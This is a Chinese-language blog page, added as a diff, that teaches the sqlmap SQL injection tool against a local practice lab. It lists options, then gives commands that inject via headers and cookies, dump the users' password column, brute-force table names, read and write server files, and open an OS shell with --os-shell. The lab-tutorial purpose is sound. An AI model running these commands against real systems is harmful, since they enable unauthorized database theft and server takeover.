@@ -1,0 +1,835 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="sqlmap的使用sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。 sqlmap常用命令-h                                           显示基本帮助信息 -hh                                         显示高级帮助信息 –version">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sqlmap的使用">
+<meta property="og:url" content="http://example.com/2023/11/25/sqlmap%E7%9A%84%E4%BD%BF%E7%94%A8/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="sqlmap的使用sqlmap简介sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。 sqlmap常用命令-h                                           显示基本帮助信息 -hh                                         显示高级帮助信息 –version">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160325787.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160819622.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160842375.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img2020051116100193.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84%E5%BA%93%E5%90%8D.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2pikachu%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164600263.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164614628.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170318789.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170525553.png">
+<meta property="article:published_time" content="2023-11-25T09:33:13.000Z">
+<meta property="article:modified_time" content="2023-11-27T11:37:18.824Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160325787.png">
+  
+  
+  
+  <title>sqlmap的使用 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Fluid</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="sqlmap的使用"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-11-25 17:33" pubdate>
+          2023年11月25日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.2k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          52 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">sqlmap的使用</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><h3 id="sqlmap简介"><a href="#sqlmap简介" class="headerlink" title="sqlmap简介"></a>sqlmap简介</h3><p>sqlmap是一款基于python编写的渗透测试工具，在sql检测和利用方面功能强大，支持多种数据库。</p>
+<h3 id="sqlmap常用命令"><a href="#sqlmap常用命令" class="headerlink" title="sqlmap常用命令"></a>sqlmap常用命令</h3><p>-h                                           显示基本帮助信息</p>
+<p>-hh                                         显示高级帮助信息</p>
+<p>–version                                显示版本号</p>
+<p>-v                                           详细等级（0-6 默认 1）<br>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头·<br>6：显示http响应内容</p>
+<p>Target：                                </p>
+<p>-u                                          指定目标url</p>
+<p>-d                                          直接连接数据库</p>
+<p>-l                                           从burp代理日志的解析目标</p>
+<p>-r                                           从文件中加载http请求</p>
+<p>-g                                          从google dork的结果作为目标url</p>
+<p>-c                                          从INI配置文件中加载选项</p>
+<p>Request</p>
+<p>-A                                         指定user-agent头</p>
+<p>-H                                         额外的header</p>
+<p>-method&#x3D;                              指定HTTP方法（GET&#x2F;POST）</p>
+<p>–data&#x3D;                                 通过POST提交数据    </p>
+<p>–param-del&#x3D;                        指定参数分隔符</p>
+<p>–cookie&#x3D;                              指定cookie的值</p>
+<p>–cookie-del&#x3D;                        指定cookie分隔符</p>
+<p>–drop-set-cookie                  扔掉response中的set-cookie头</p>
+<p>–random-agent                    使用随机的user-agent头</p>
+<p>–host&#x3D;                                  设置host头 </p>
+<p>–referer&#x3D;                              指定referer头</p>
+<p>–headers&#x3D;                            额外的headers</p>
+<p>–auth-type&#x3D;                          http认证类型（Basic，NTLM，Digest）</p>
+<p>–auith-cred&#x3D;                         http认证凭证（账号：密码）</p>
+<p>–ignore-proxy                       忽略系统代理（常用于扫描本地文件）</p>
+<p>–proxy&#x3D;                                使用代理</p>
+<p>–proxy-cred&#x3D;                        代理认证证书（账号：密码）</p>
+<p>–delay&#x3D;                                 设置延迟时间（两个请求之间）</p>
+<p>–timeout&#x3D;                              超时时来连接前等待（默认 30）</p>
+<p>–retries&#x3D;                                连接超时时重试次数（默认 3）</p>
+<p>–randomize&#x3D;                         随机更改指定的参数的值</p>
+<p>–safe-url&#x3D;                             在测试期间经常访问的URL</p>
+<p>–safe-post&#x3D;                           POST数据发送到安全的URL</p>
+<p>–safe-freq&#x3D;                           两次请求之间穿插一个安全的URL   </p>
+<p>–skip-urlencode                    跳过payload数据的URL编码</p>
+<p>–chunked                             使用HTTP分块传输加密POST请求</p>
+<p>–hpp                                    使用HTTP参数pollution方法（常用于绕过IPS&#x2F;IDS检测）</p>
+<p>–force-ssl                             强制使用SSL&#x2F;HTTPS</p>
+<p>–eval&#x3D;value                         请求之前提供Python代码（eg：”import hashlib;id2&#x3D;hashlib.md5(id).hexdigest()”）</p>
+<p>Optimization</p>
+<p>-o                                         打开所有优化开关</p>
+<p>–predict-output                   预测输出（与–threads不兼容）</p>
+<p>–keep-alive                         建立长久的HTTP(S)连接 (与–proxy不兼容)</p>
+<p>–null-connection                 空连接</p>
+<p>–threads&#x3D;value                  设置线程(默认 1)</p>
+<p>Injection</p>
+<p>-p                                       指定测试参数</p>
+<p>–skip&#x3D;                               跳过指定参数的测试</p>
+<p>–skip-static                        跳过测试静态的参数</p>
+<p>–dbms&#x3D;                             指定具体DBMS</p>
+<p>–os&#x3D;                                  指定DBMS操作系统</p>
+<p>–invalid-bignum                使用大数字使值无效</p>
+<p>–invalid-logical                  使用逻辑符使值无效</p>
+<p>–invalid-string                   使用字符串使值无效</p>
+<p>–no-cast                             关闭payload铸造机制</p>
+<p>–no-escape                       关闭字符转义机制（默认自动开启）</p>
+<p>–prefix&#x3D;                             加入payload前缀</p>
+<p>–suffix&#x3D;                              加入payload后缀</p>
+<p>–tamper&#x3D;                          指定使用的脚本</p>
+<p>Detectiong</p>
+<p>–level&#x3D;                              指定测试的等级（1-5 默认为1）</p>
+<p>–risk&#x3D;                               指定测试的风险（0-3 默认为1）</p>
+<p>–string&#x3D;                            登录成功时，页面所含有的“关键字” 用于证明已经登录成功</p>
+<p>–not-string&#x3D;                      登录成功时，页面所含有的“关键字” 用于证明已经登录失败</p>
+<p>–code&#x3D;                             查询为真时，匹配的HTTP代码</p>
+<p>–smart                              当有大量检测目标时，只选择基于错误的检测结果</p>
+<p>–text-only                         仅基于文本内容比较网页</p>
+<p>–titles                               仅基于标题比较网页</p>
+<p>Techniques</p>
+<p>–technique&#x3D;                      指定sql注入技术（默认BEUSTQ）</p>
+<p>–time-sec&#x3D;                        基于时间注入检测相应的延迟时间（默认为5秒）</p>
+<p>–union-clos&#x3D;                     进行查询时，指定列的范围</p>
+<p>–union-char&#x3D;                    指定暴力破解列数的字符</p>
+<p>Fingerprint</p>
+<p>-f                                      查询目标DBMS版本指纹信息</p>
+<p>Emuneration</p>
+<p>-a                                    查询所有  </p>
+<p>-b                                    查询目标DBMS banner信息</p>
+<p>–current-user                 查询目标DBMS当前用户</p>
+<p>–current-db                    查询目标DBMS当前数据库</p>
+<p>–is-dba                          查询目标DBMS当前用户是否为DBA</p>
+<p>–users                            枚举目标DBMS所有的用户</p>
+<p>–paswords                     枚举目标DBMS用户密码哈希值</p>
+<p>–privileges                     枚举目标DBMS用户的权限</p>
+<p>–roles                            枚举DBMS用户的角色</p>
+<p>–dbs                              枚举DBMS所有的数据库</p>
+<p>–tables                          枚举DBMS数据库中所有的表</p>
+<p>–columns                      枚举DBMS数据库表中所有的列</p>
+<p>–count                         检索表的条目的数量</p>
+<p>–dump                         存储DBMS数据库的表中的条目</p>
+<p>–dump-all                     存储DBMS所有数据库表中的条目</p>
+<p>-D db                          指定进行枚举的数据库名称</p>
+<p>-T   table                     指定进行枚举的数据库表名称</p>
+<p>-C   column                 指定进行枚举的数据库列名称</p>
+<p>–exclude-sysdbs          枚举表时排除系统数据库</p>
+<p>–sql-query                    指定查询的sql语句</p>
+<p>–sql-shell                     提示输入一个交互式sql shell</p>
+<p>Brute force</p>
+<p>–common-tables                       暴力破解表 </p>
+<p>–common-colomns                    暴力破解列</p>
+<p>File system access</p>
+<p>–file-read                            从目标数据库管理文件系统读取文件</p>
+<p>–file-write                           上传文件到目标数据库管理文件系统</p>
+<p>–file-dest                             指定写入文件的绝对路径</p>
+<p>–os-cmd&#x3D;                           执行操作系统命令</p>
+<p>–os-shell                            交互式的系统shell</p>
+<p>–os-pwn                             获取一个OOB shell，Meterpreter或者VNC</p>
+<p>–os-smbrelay                    一键 获取一个OOB shell，Meterpreter或者VNC</p>
+<p>–os-bof                              储存过程缓冲区溢出利用</p>
+<p>–os-esc                              数据库进程用户权限提升</p>
+<p>–msf-path&#x3D;                        Metasploit  Framework本地安装路径</p>
+<p>General</p>
+<p>-s                                     sqlite会话文件保存位置</p>
+<p>-t                                      记录所有HTTP流量到指定文件中</p>
+<p>–batch                             测试过程中， 执行所有默认配置</p>
+<p>–charset&#x3D;v                      强制用于数据检索的字符编码 </p>
+<p>–crawl&#x3D;                           从目标URL开始爬取网站</p>
+<p>–crawl-exclude&#x3D;              禁止爬取某个页面（eg：logout）</p>
+<p>–csv-del&#x3D;                        指定CSV输出中使用的的字符</p>
+<p>–dump-format&#x3D;               储存数据的方式（CSV(default)，HTML，SQLITE）</p>
+<p>–flush-session                 刷新当前目标的会话文件</p>
+<p>–fresh-queries                 忽略会话文件中储存的查询结果，重新查询</p>
+<p>–hex                                使用DBMS hex函数进行数据检索</p>
+<p>–outpout-dir&#x3D;                  自定义输出目录</p>
+<p>–save&#x3D;                            保存选项到INI配置文件中</p>
+<p>–scope&#x3D;                          使用正则表达式从提供的日志中guo’l</p>
+<p>–alert                               再找到SQL注入时运行主机操作系统命令</p>
+<p>–purge-output                  安全的从输出目录中删除所有内容</p>
+<p>–sqlmap-shell                  提示输入交互式sqlmap  shell</p>
+<p>–update                           更新sqlmap</p>
+<h3 id="sqlmap主要功能"><a href="#sqlmap主要功能" class="headerlink" title="sqlmap主要功能"></a>sqlmap主要功能</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs diff"><span class="hljs-deletion">-u 指定目标URL (可以是http协议也可以是https协议)</span><br> <br><span class="hljs-deletion">-d 连接数据库</span><br> <br><span class="hljs-deletion">--dbs 列出所有的数据库</span><br> <br><span class="hljs-deletion">--current-db 列出当前数据库</span><br> <br><span class="hljs-deletion">--tables 列出当前的表</span><br> <br><span class="hljs-deletion">--columns 列出当前的列</span><br> <br><span class="hljs-deletion">-D 选择使用哪个数据库</span><br> <br><span class="hljs-deletion">-T 选择使用哪个表</span><br> <br><span class="hljs-deletion">-C 选择使用哪个列</span><br> <br><span class="hljs-deletion">--dump 获取字段中的数据</span><br> <br><span class="hljs-deletion">--batch 自动选择yes</span><br> <br><span class="hljs-deletion">--smart 启发式快速判断，节约浪费时间</span><br>   <br><span class="hljs-deletion">--forms 尝试使用post注入</span><br> <br><span class="hljs-deletion">-r 加载文件中的HTTP请求（本地保存的请求包txt文件）</span><br> <br><span class="hljs-deletion">-l 加载文件中的HTTP请求（本地保存的请求包日志文件）</span><br> <br><span class="hljs-deletion">-g 自动获取Google搜索的前一百个结果，对有GET参数的URL测试</span><br> <br><span class="hljs-deletion">-o 开启所有默认性能优化</span><br> <br><span class="hljs-deletion">--tamper 调用脚本进行注入</span><br> <br><span class="hljs-deletion">-v 指定sqlmap的回显等级</span><br> <br><span class="hljs-deletion">--delay 设置多久访问一次</span><br> <br><span class="hljs-deletion">--os-shell 获取主机shell，一般不太好用，因为没权限</span><br> <br><span class="hljs-deletion">-m 批量操作</span><br> <br><span class="hljs-deletion">-c 指定配置文件，会按照该配置文件执行动作</span><br> <br><span class="hljs-deletion">-data data指定的数据会当做post数据提交</span><br> <br><span class="hljs-deletion">-timeout 设定超时时间</span><br> <br><span class="hljs-deletion">--level 设置注入探测等级</span><br> <br><span class="hljs-deletion">--risk 风险等级</span><br> <br><span class="hljs-deletion">--identify-waf 检测防火墙类型</span><br> <br><span class="hljs-deletion">--param-del=&quot;分割符&quot; 设置参数的分割符</span><br> <br><span class="hljs-deletion">--skip-urlencode 不进行url编码</span><br> <br><span class="hljs-deletion">--keep-alive 设置持久连接，加快探测速度</span><br> <br><span class="hljs-deletion">--null-connection 检索没有body响应的内容，多用于盲注</span><br> <br><span class="hljs-deletion">--thread 最大为10 设置多线程</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="sqlmap注入技术简介"><a href="#sqlmap注入技术简介" class="headerlink" title="sqlmap注入技术简介"></a>sqlmap注入技术简介</h3><p>–technique&#x3D;     （默认全部使用）</p>
+<p>B       基于布尔的盲注</p>
+<p>T       基于时间的盲注</p>
+<p>E      基于报错的注入</p>
+<p>U      基于UNION查询注入</p>
+<p>S      基于多语句查询注入</p>
+<p>sqlmap获取目标方式<br>1.指定目标url</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“</p>
+<p>2.从文件中获取多个url</p>
+<p>sqlmap -m 1.txt</p>
+<p>3.从文件中加载HTTP请求</p>
+<p>sqlmap -r  url.txt</p>
+<p>4.利用google获取目标</p>
+<p>sqlmap -g “inurl:&quot;.php?id&#x3D;1&quot;“</p>
+<p>5.从burp日志中获取目标</p>
+<p>sqlmap -l    burp.txt</p>
+<p>实例演示-sqlmap注入检测<br>1.GET参数注入</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“</p>
+<p>2.POST参数注入</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  –data&#x3D;”id&#x3D;1”</p>
+<p>3.cookie注入 （level&gt;&#x3D;2时才会检测cookie）  </p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 2</p>
+<p>如图，用 * 号指定cookie，这样就可以检测cookie。</p>
+<p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160325787.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>4.user-agent注入</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 3</p>
+<p>如图，用 * 号指定user-agent，这样就可以检测user-agent。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160819622.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p>
+<p>5.referer注入</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 3</p>
+<p>如图，用 * 号指定referer，这样就可以检测referer。</p>
+<p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511160842375.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>6.host注入</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –level 5</p>
+<p>如图，用 * 号指定host，这样就可以检测host。</p>
+<p>python sqlmap.py  -r”&#x2F;root&#x2F;1.txt” </p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img2020051116100193.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>实例演示-获取数据库信息<br>1.查看数据库</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –dbs  –batch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2%E7%BD%91%E7%AB%99%E7%9A%84%E5%BA%93%E5%90%8D.png" srcset="/img/loading.gif" lazyload alt="查询网站的库名"></p>
+<p><strong>2.查看数据库里面的表</strong></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D pikachu –tables –batch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E8%AF%A2pikachu%E5%BA%93%E7%9A%84%E8%A1%A8%E5%90%8D.png" srcset="/img/loading.gif" lazyload alt="查询pikachu库的表名"></p>
+<p><strong>3.查看数据库表里面的列</strong></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -T users –columns  –batch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png" srcset="/img/loading.gif" lazyload alt="查看表中字段名"></p>
+<p>4.查看数据库列里面的具体的值</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -T users -C password  –dump  –batch<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img%E6%9F%A5%E7%9C%8B%E8%A1%A8%E4%B8%AD%E5%AD%97%E6%AE%B5%E5%90%8D.png" srcset="/img/loading.gif" lazyload alt="查看表中字段名"></p>
+<h3 id="实例演示-暴力破解"><a href="#实例演示-暴力破解" class="headerlink" title="实例演示-暴力破解"></a>实例演示-暴力破解</h3><p>使用条件：</p>
+<p>1.MySQL数据库版本小于5.0，没有information——schema表。</p>
+<p>2.Microssoft Access数据库。</p>
+<p>3.当前用户没有权限读取系统中保存的数据。</p>
+<p>*暴力破解中破解表名的文件位于common-tables.txt 中，同理破解列名的文件位于common-columns.txt 中</p>
+<p>1.暴力破解表名</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  -D security –common-tables –batch<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164600263.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p><strong>2.暴力破解列名</strong></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ -D security -Tusers –common-columns –batch</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511164614628.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="实例演示-读取文件-上传文件"><a href="#实例演示-读取文件-上传文件" class="headerlink" title="实例演示-读取文件&#x2F;上传文件"></a>实例演示-读取文件&#x2F;上传文件</h3><p><strong>1.读取文件</strong></p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“  –file-read “C:&#x2F;post.txt”</p>
+<p><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170318789.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<p>2写入文件</p>
+<p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“   –file-write “&#x2F;root&#x2F;1.txt” –file-dest “C:&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;www&#x2F;1.txt”<br><img src="https://cdn.jsdelivr.net/gh/LINF2009/tupianku@main//img20200511170525553.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h4 id="实例演示-获取shell"><a href="#实例演示-获取shell" class="headerlink" title="实例演示-获取shell"></a>实例演示-获取shell</h4><p>python sqlmap.py -u “<a target="_blank" rel="noopener" href="http://192.168.73.131/sqli/Less-1/?id=1">http://192.168.73.131/sqli/Less-1/?id=1</a>“ –os-shell</p>
+
+                
+              </div>
+            
